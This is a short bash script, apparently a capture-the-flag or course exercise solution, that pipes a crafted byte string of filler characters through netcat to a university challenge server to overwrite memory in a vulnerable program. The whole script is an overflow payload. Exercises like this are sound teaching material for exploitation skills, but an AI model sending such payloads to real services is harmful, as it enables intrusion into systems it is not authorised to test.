#!/bin/bash

python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAA' + b'B' * 0x28 + b'AAAAAAAA' + b'\n')" | nc mustard.stt.rnl.tecnico.ulisboa.pt 22161
